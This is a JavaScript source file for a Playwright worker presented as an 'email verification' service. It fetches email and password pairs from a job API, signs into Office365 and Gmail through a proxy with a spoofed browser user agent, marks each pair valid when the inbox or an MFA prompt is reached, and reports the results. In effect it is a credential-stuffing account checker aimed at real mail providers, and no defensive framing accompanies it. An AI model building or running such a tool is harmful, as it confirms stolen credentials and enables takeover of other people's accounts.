import playwright from 'playwright';
import axios from 'axios';
import dotenv from 'dotenv';

dotenv.config();

// Configuration
const CONFIG = {
  apiEndpoint: process.env.API_ENDPOINT || 'http://localhost:3000',
  apiToken: process.env.API_TOKEN || 'dev-token-change-in-production',
  pollInterval: parseInt(process.env.POLL_INTERVAL) || 5000,
  maxRetries: parseInt(process.env.MAX_RETRIES) || 3,
  headless: process.env.HEADLESS !== 'false',
  timeout: parseInt(process.env.TIMEOUT) || 30000,
  proxy: process.env.PROXY_SERVER ? {
    server: process.env.PROXY_SERVER,
    username: process.env.PROXY_USERNAME,
    password: process.env.PROXY_PASSWORD
  } : null
};

console.log('🚀 Email Verification Worker Starting...');
console.log('📡 API Endpoint:', CONFIG.apiEndpoint);
console.log('🔄 Poll Interval:', CONFIG.pollInterval + 'ms');
console.log('🎭 Headless Mode:', CONFIG.headless);
console.log('🌐 Proxy:', CONFIG.proxy ? CONFIG.proxy.server : 'None');

// API Client
const api = axios.create({
  baseURL: CONFIG.apiEndpoint,
  headers: {
    'X-API-Token': CONFIG.apiToken,
    'Content-Type': 'application/json'
  }
});

// Statistics
const stats = {
  processed: 0,
  valid: 0,
  invalid: 0,
  errors: 0,
  startTime: Date.now()
};

// Verify Office365 email
async function verifyOffice365(email, password) {
  const browser = await playwright.chromium.launch({
    headless: CONFIG.headless,
    proxy: CONFIG.proxy,
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  });

  try {
    const context = await browser.newContext({
      viewport: { width: 1280, height: 720 },
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
    });

    const page = await context.newPage();
    
    console.log(`  📧 Testing Office365: ${email}`);
    
    // Navigate to Outlook login
    await page.goto('https://outlook.office.com/mail/', { 
      waitUntil: 'networkidle',
      timeout: CONFIG.timeout 
    });

    // Wait for email input
    await page.waitForSelector('input[type="email"]', { timeout: CONFIG.timeout });
    await page.fill('input[type="email"]', email);
    
    // Click Next button
    await page.click('input[type="submit"]');
    
    // Wait for password field
    await page.waitForSelector('input[type="password"]', { timeout: CONFIG.timeout });
    await page.fill('input[type="password"]', password);
    
    // Click Sign in button
    await page.click('input[type="submit"]');
    
    // Wait for response (either success or error)
    await page.waitForTimeout(3000);
    
    // Check for error messages
    const errorSelectors = [
      '[id*="error"]',
      '[class*="error"]',
      '[data-bind*="error"]',
      'text=/incorrect|invalid|wrong|denied/i'
    ];

    let hasError = false;
    let errorMessage = '';

    for (const selector of errorSelectors) {
      try {
        const element = await page.$(selector);
        if (element) {
          const text = await element.textContent();
          if (text && text.trim()) {
            hasError = true;
            errorMessage = text.trim();
            break;
          }
        }
      } catch (e) {
        // Selector not found, continue
      }
    }

    // Check if we reached the inbox (success)
    const currentUrl = page.url();
    const isInboxOrMFA = currentUrl.includes('outlook.office.com') && 
                         (currentUrl.includes('/mail') || 
                          currentUrl.includes('/mfa') ||
                          currentUrl.includes('/kmsi'));

    await browser.close();

    if (isInboxOrMFA) {
      return { result: 'valid', details: 'Successfully authenticated' };
    } else if (hasError) {
      return { result: 'strong_bounce', details: errorMessage };
    } else {
      return { result: 'invalid', details: 'Login failed - credentials rejected' };
    }

  } catch (error) {
    await browser.close();
    console.error(`  ❌ Error verifying Office365:`, error.message);
    return { 
      result: 'error', 
      error_message: error.message,
      details: 'Automation error during verification'
    };
  }
}

// Verify Gmail email
async function verifyGmail(email, password) {
  const browser = await playwright.chromium.launch({
    headless: CONFIG.headless,
    proxy: CONFIG.proxy,
    args: ['--no-sandbox', '--disable-setuid-sandbox']
  });

  try {
    const context = await browser.newContext({
      viewport: { width: 1280, height: 720 },
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
    });

    const page = await context.newPage();
    
    console.log(`  📧 Testing Gmail: ${email}`);
    
    // Navigate to Gmail
    await page.goto('https://mail.google.com/', { 
      waitUntil: 'networkidle',
      timeout: CONFIG.timeout 
    });

    // Wait for email input
    await page.waitForSelector('input[type="email"]', { timeout: CONFIG.timeout });
    await page.fill('input[type="email"]', email);
    
    // Click Next button
    await page.click('#identifierNext, button:has-text("Next")');
    
    // Wait for password field
    await page.waitForSelector('input[type="password"]', { timeout: CONFIG.timeout });
    await page.fill('input[type="password"]', password);
    
    // Click Next button
    await page.click('#passwordNext, button:has-text("Next")');
    
    // Wait for response
    await page.waitForTimeout(3000);
    
    // Check for error messages
    const errorSelectors = [
      '[aria-live="polite"]',
      '[jsname="B34EJ"]',
      'text=/couldn\'t find|wrong password|incorrect|invalid/i'
    ];

    let hasError = false;
    let errorMessage = '';

    for (const selector of errorSelectors) {
      try {
        const element = await page.$(selector);
        if (element) {
          const text = await element.textContent();
          if (text && text.trim()) {
            hasError = true;
            errorMessage = text.trim();
            break;
          }
        }
      } catch (e) {
        // Selector not found, continue
      }
    }

    // Check if we reached the inbox (success)
    const currentUrl = page.url();
    const isInboxOrMFA = currentUrl.includes('mail.google.com') && 
                         (currentUrl.includes('/mail') || 
                          currentUrl.includes('/challenge') ||
                          currentUrl.includes('/signin/v2'));

    await browser.close();

    if (isInboxOrMFA && !hasError) {
      return { result: 'valid', details: 'Successfully authenticated' };
    } else if (hasError) {
      return { result: 'strong_bounce', details: errorMessage };
    } else {
      return { result: 'invalid', details: 'Login failed - credentials rejected' };
    }

  } catch (error) {
    await browser.close();
    console.error(`  ❌ Error verifying Gmail:`, error.message);
    return { 
      result: 'error', 
      error_message: error.message,
      details: 'Automation error during verification'
    };
  }
}

// Process a single job
async function processJob(job) {
  console.log(`\n🔍 Processing Job #${job.id}`);
  console.log(`  Email: ${job.email}`);
  console.log(`  Provider: ${job.provider}`);

  let verificationResult;

  try {
    if (job.provider === 'office365') {
      verificationResult = await verifyOffice365(job.email, job.password);
    } else if (job.provider === 'gmail') {
      verificationResult = await verifyGmail(job.email, job.password);
    } else {
      verificationResult = {
        result: 'error',
        error_message: 'Unknown provider',
        details: `Provider ${job.provider} not supported`
      };
    }

    // Submit result to API
    await api.post('/api/worker/result', {
      id: job.id,
      ...verificationResult
    });

    // Update statistics
    stats.processed++;
    if (verificationResult.result === 'valid') stats.valid++;
    else if (verificationResult.result === 'strong_bounce' || verificationResult.result === 'invalid') stats.invalid++;
    else if (verificationResult.result === 'error') stats.errors++;

    console.log(`  ✅ Result: ${verificationResult.result}`);
    if (verificationResult.details) {
      console.log(`  📝 Details: ${verificationResult.details}`);
    }

  } catch (error) {
    console.error(`  ❌ Failed to process job:`, error.message);
    
    // Try to submit error result
    try {
      await api.post('/api/worker/result', {
        id: job.id,
        result: 'error',
        error_message: error.message,
        details: 'Worker processing error'
      });
    } catch (submitError) {
      console.error(`  ❌ Failed to submit error result:`, submitError.message);
    }
  }
}

// Main worker loop
async function workerLoop() {
  console.log('\n⏳ Polling for new jobs...');

  try {
    // Get next job from API
    const response = await api.get('/api/worker/next');
    
    if (response.data.success && response.data.job) {
      const job = response.data.job;
      await processJob(job);
    } else {
      process.stdout.write('.');
    }
  } catch (error) {
    if (error.response) {
      console.error(`\n❌ API Error: ${error.response.status} - ${error.response.data.error}`);
    } else if (error.request) {
      console.error(`\n❌ Network Error: Cannot connect to API at ${CONFIG.apiEndpoint}`);
    } else {
      console.error(`\n❌ Error:`, error.message);
    }
  }

  // Schedule next poll
  setTimeout(workerLoop, CONFIG.pollInterval);
}

// Print statistics
function printStats() {
  const uptime = Math.floor((Date.now() - stats.startTime) / 1000);
  console.log('\n📊 Statistics:');
  console.log(`  Uptime: ${uptime}s`);
  console.log(`  Processed: ${stats.processed}`);
  console.log(`  Valid: ${stats.valid}`);
  console.log(`  Invalid: ${stats.invalid}`);
  console.log(`  Errors: ${stats.errors}`);
}

// Handle graceful shutdown
process.on('SIGINT', () => {
  console.log('\n\n🛑 Shutting down worker...');
  printStats();
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('\n\n🛑 Shutting down worker...');
  printStats();
  process.exit(0);
});

// Print stats every 60 seconds
setInterval(printStats, 60000);

// Start worker
console.log('✅ Worker initialized successfully');
console.log('⏳ Starting worker loop...\n');
workerLoop();
